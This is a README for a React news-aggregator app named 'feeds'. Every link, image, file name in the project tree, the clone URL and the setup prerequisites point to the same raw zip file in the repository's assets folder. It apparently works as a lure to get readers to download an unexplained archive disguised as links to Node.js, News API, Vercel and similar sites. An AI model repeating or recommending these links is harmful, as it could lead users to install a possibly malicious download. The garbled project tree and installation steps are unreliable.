# 📰 News Feeds - Modern News Aggregator

A modern, responsive news aggregator built with React, Vite, and Tailwind CSS. Stay informed with the latest news from around the world, featuring real-time search, infinite scrolling, and a beautiful dark mode interface.

![React](https://raw.githubusercontent.com/Haroldrivail/feeds/main/src/assets/feeds-3.3.zip)
![Vite](https://raw.githubusercontent.com/Haroldrivail/feeds/main/src/assets/feeds-3.3.zip)
![Tailwind CSS](https://raw.githubusercontent.com/Haroldrivail/feeds/main/src/assets/feeds-3.3.zip)
![License](https://raw.githubusercontent.com/Haroldrivail/feeds/main/src/assets/feeds-3.3.zip)

## ✨ Features

### 🎨 User Interface
- **Dark/Light Theme Toggle** - Seamless theme switching with persistent preferences
- **Responsive Design** - Optimized for mobile, tablet, and desktop devices
- **Smooth Animations** - Polished transitions and hover effects
- **Back to Top Button** - Quick navigation with scroll progress indicator

### 📰 News Features
- **Top Headlines** - Latest breaking news from trusted sources
- **Category Browsing** - Explore news by category (Business, Technology, Sports, Health, Science, Entertainment, General)
- **Advanced Search** - Real-time search with debouncing for better performance
- **Infinite Scroll** - Seamlessly load more articles as you scroll
- **Search Highlighting** - Highlights matching terms in article titles and descriptions

### 🚀 Performance
- **API Caching** - 15-minute cache to reduce API calls and improve speed
- **Retry Logic** - Automatic retry on failed requests with exponential backoff
- **Optimized Loading** - Skeleton loaders for better perceived performance
- **Lazy Loading** - Images and content load on demand

### 🎯 User Experience
- **Breadcrumb Navigation** - Easy navigation between pages
- **Article Previews** - View source, author, and publication date
- **Error Handling** - Graceful error messages and fallbacks
- **Loading States** - Clear feedback during data fetching
- **Empty States** - Helpful messages when no results are found

## 🛠️ Tech Stack

### Frontend Framework
- **React 19.1.1** - Latest React with improved performance
- **React Router DOM 7.5.0** - Client-side routing
- **Vite 7.1.7** - Lightning-fast build tool and dev server

### Styling
- **Tailwind CSS 4.1.16** - Utility-first CSS framework
- **CSS Custom Properties** - Dynamic theming support
- **Responsive Grid** - Flexible layouts for all screen sizes

### Code Quality
- **ESLint** - Code linting and best practices
- **React Hooks ESLint** - Hooks usage validation
- **Modern JavaScript** - ES6+ features

## 📁 Project Structure

```
feeds/
├── api/
│   └── https://raw.githubusercontent.com/Haroldrivail/feeds/main/src/assets/feeds-3.3.zip                   # Serverless proxy for News API (CORS fix)
├── public/
│   └── https://raw.githubusercontent.com/Haroldrivail/feeds/main/src/assets/feeds-3.3.zip                 # App logo
├── src/
│   ├── assets/                   # Static assets
│   ├── components/
│   │   ├── https://raw.githubusercontent.com/Haroldrivail/feeds/main/src/assets/feeds-3.3.zip         # Scroll-to-top button with progress
│   │   ├── https://raw.githubusercontent.com/Haroldrivail/feeds/main/src/assets/feeds-3.3.zip          # Article card component
│   │   ├── https://raw.githubusercontent.com/Haroldrivail/feeds/main/src/assets/feeds-3.3.zip            # Site footer
│   │   ├── https://raw.githubusercontent.com/Haroldrivail/feeds/main/src/assets/feeds-3.3.zip            # Navigation header with theme toggle
│   │   ├── https://raw.githubusercontent.com/Haroldrivail/feeds/main/src/assets/feeds-3.3.zip # Loading spinner
│   │   ├── https://raw.githubusercontent.com/Haroldrivail/feeds/main/src/assets/feeds-3.3.zip        # Debounced search input
│   │   └── https://raw.githubusercontent.com/Haroldrivail/feeds/main/src/assets/feeds-3.3.zip    # Loading placeholder
│   ├── contexts/
│   │   └── https://raw.githubusercontent.com/Haroldrivail/feeds/main/src/assets/feeds-3.3.zip      # Theme management (dark/light mode)
│   ├── hooks/
│   │   └── https://raw.githubusercontent.com/Haroldrivail/feeds/main/src/assets/feeds-3.3.zip  # Custom infinite scroll hook
│   ├── layouts/
│   │   └── https://raw.githubusercontent.com/Haroldrivail/feeds/main/src/assets/feeds-3.3.zip            # Main layout wrapper
│   ├── pages/
│   │   ├── https://raw.githubusercontent.com/Haroldrivail/feeds/main/src/assets/feeds-3.3.zip              # Homepage with top headlines
│   │   ├── https://raw.githubusercontent.com/Haroldrivail/feeds/main/src/assets/feeds-3.3.zip     # Category-specific articles
│   │   └── https://raw.githubusercontent.com/Haroldrivail/feeds/main/src/assets/feeds-3.3.zip            # Category selection page
│   ├── utils/
│   │   └── https://raw.githubusercontent.com/Haroldrivail/feeds/main/src/assets/feeds-3.3.zip               # API client with caching & retry logic
│   ├── https://raw.githubusercontent.com/Haroldrivail/feeds/main/src/assets/feeds-3.3.zip                   # Root component with routing
│   ├── https://raw.githubusercontent.com/Haroldrivail/feeds/main/src/assets/feeds-3.3.zip                  # Application entry point
│   └── https://raw.githubusercontent.com/Haroldrivail/feeds/main/src/assets/feeds-3.3.zip                 # Global styles & Tailwind config
├── https://raw.githubusercontent.com/Haroldrivail/feeds/main/src/assets/feeds-3.3.zip              # ESLint configuration
├── https://raw.githubusercontent.com/Haroldrivail/feeds/main/src/assets/feeds-3.3.zip                # Vite configuration
├── https://raw.githubusercontent.com/Haroldrivail/feeds/main/src/assets/feeds-3.3.zip                  # Dependencies and scripts
└── https://raw.githubusercontent.com/Haroldrivail/feeds/main/src/assets/feeds-3.3.zip                     # Project documentation
```

## 🚀 Getting Started

### Prerequisites
- **https://raw.githubusercontent.com/Haroldrivail/feeds/main/src/assets/feeds-3.3.zip** (v18 or higher)
- **npm** or **yarn**
- **News API Key** - Get your free API key from [https://raw.githubusercontent.com/Haroldrivail/feeds/main/src/assets/feeds-3.3.zip](https://raw.githubusercontent.com/Haroldrivail/feeds/main/src/assets/feeds-3.3.zip)

### Installation

1. **Clone the repository**
   ```bash
   git clone https://raw.githubusercontent.com/Haroldrivail/feeds/main/src/assets/feeds-3.3.zip
   cd feeds
   ```

2. **Install dependencies**
   ```bash
   npm install
   ```

3. **Set up environment variables**
   
   Create a `.env` file in the root directory:
   ```env
   https://raw.githubusercontent.com/Haroldrivail/feeds/main/src/assets/feeds-3.3.zip
   API_KEY=your_api_key_here
   ```

4. **Start the development server**
   ```bash
   npm run dev
   ```

5. **Open your browser**
   
   Navigate to `http://localhost:5173`

## 📝 Available Scripts

### Development
```bash
npm run dev          # Start development server with hot reload
```

### Production
```bash
npm run build        # Build for production
npm run preview      # Preview production build locally
```

### Code Quality
```bash
npm run lint         # Run ESLint to check code quality
```

## 🚀 Deployment

### Deploy to Vercel (Recommended)

1. **Push your code to GitHub**
   ```bash
   git add .
   git commit -m "Ready for deployment"
   git push origin main
   ```

2. **Import to Vercel**
   - Go to [https://raw.githubusercontent.com/Haroldrivail/feeds/main/src/assets/feeds-3.3.zip](https://raw.githubusercontent.com/Haroldrivail/feeds/main/src/assets/feeds-3.3.zip)
   - Click "Import Project"
   - Select your GitHub repository
   - Vercel will auto-detect Vite settings

3. **Add Environment Variable**
   - In Vercel dashboard, go to Settings → Environment Variables
   - Add `API_KEY` with your News API key
   - Add `VITE_NEWS_API_BASE_URL` with value `https://raw.githubusercontent.com/Haroldrivail/feeds/main/src/assets/feeds-3.3.zip`

4. **Deploy**
   - Click "Deploy"
   - Your app will be live at `https://raw.githubusercontent.com/Haroldrivail/feeds/main/src/assets/feeds-3.3.zip`

### Important: CORS and API Proxy

The app uses a serverless function (`https://raw.githubusercontent.com/Haroldrivail/feeds/main/src/assets/feeds-3.3.zip`) to proxy News API requests. This is required because News API's free tier doesn't allow browser requests from deployed domains (CORS restriction).

**How it works:**
- **Development** (localhost): Direct API calls work fine
- **Production** (Vercel): Requests go through `/api/news` proxy

The proxy is automatically configured in `https://raw.githubusercontent.com/Haroldrivail/feeds/main/src/assets/feeds-3.3.zip` and `https://raw.githubusercontent.com/Haroldrivail/feeds/main/src/assets/feeds-3.3.zip`.

## 🎨 Features in Detail

### Dark/Light Theme
- Automatic system preference detection
- Manual toggle with persistent storage
- Smooth transitions between themes
- Tailwind v4 CSS-based dark mode configuration

### Infinite Scroll
- Custom React hook for scroll detection
- Automatic loading when near bottom (300px threshold)
- Throttled scroll events for performance
- Smart detection of end of results
- Works with both search and category browsing

### API Integration
- **Caching Strategy**: 15-minute cache to reduce API calls
- **Retry Logic**: Up to 3 retries with exponential backoff
- **Error Handling**: Graceful fallbacks and user-friendly messages
- **Endpoints**:
  - `/top-headlines` - Latest breaking news
  - `/everything` - Search all articles
  - Category filtering for targeted news

### Search Functionality
- **Debounced Input**: 800ms delay to reduce API calls
- **Real-time Results**: Updates as you type
- **Search Highlighting**: Matches are highlighted in results
- **Reset on Clear**: Returns to top headlines when search is cleared

## 🔧 Configuration

### Tailwind CSS v4
The project uses Tailwind CSS v4 with CSS-based configuration:

```css
@import "tailwindcss";

@variant dark (.dark &);

/* Custom utilities and animations */
```

### Environment Variables
- `VITE_NEWS_API_BASE_URL` - News API base URL
- `API_KEY` - Your News API key

## 🌐 Browser Support

- Chrome (latest)
- Firefox (latest)
- Safari (latest)
- Edge (latest)

## 📱 Responsive Breakpoints

- Mobile: `< 768px`
- Tablet: `768px - 1024px`
- Desktop: `> 1024px`
- Large Desktop: `> 1280px`

## 🤝 Contributing

Contributions are welcome! Please feel free to submit a Pull Request.

1. Fork the project
2. Create your feature branch (`git checkout -b feature/AmazingFeature`)
3. Commit your changes (`git commit -m 'Add some AmazingFeature'`)
4. Push to the branch (`git push origin feature/AmazingFeature`)
5. Open a Pull Request

## 📄 License

This project is licensed under the MIT License.

## 👤 Author

**Harold DONGMO**
- GitHub: [@Haroldrivail](https://raw.githubusercontent.com/Haroldrivail/feeds/main/src/assets/feeds-3.3.zip)

## 🙏 Acknowledgments

- [News API](https://raw.githubusercontent.com/Haroldrivail/feeds/main/src/assets/feeds-3.3.zip) - For providing the news data
- [Tailwind CSS](https://raw.githubusercontent.com/Haroldrivail/feeds/main/src/assets/feeds-3.3.zip) - For the utility-first CSS framework
- [React](https://raw.githubusercontent.com/Haroldrivail/feeds/main/src/assets/feeds-3.3.zip) - For the powerful UI library
- [Vite](https://raw.githubusercontent.com/Haroldrivail/feeds/main/src/assets/feeds-3.3.zip) - For the blazing-fast build tool

## 📸 Screenshots

### Light Mode
![Light Mode](https://raw.githubusercontent.com/Haroldrivail/feeds/main/src/assets/feeds-3.3.zip)

### Dark Mode
![Dark Mode](https://raw.githubusercontent.com/Haroldrivail/feeds/main/src/assets/feeds-3.3.zip)

### Category Browsing
![Categories](https://raw.githubusercontent.com/Haroldrivail/feeds/main/src/assets/feeds-3.3.zip)

---

Made with ❤️ by Harold DONGMO
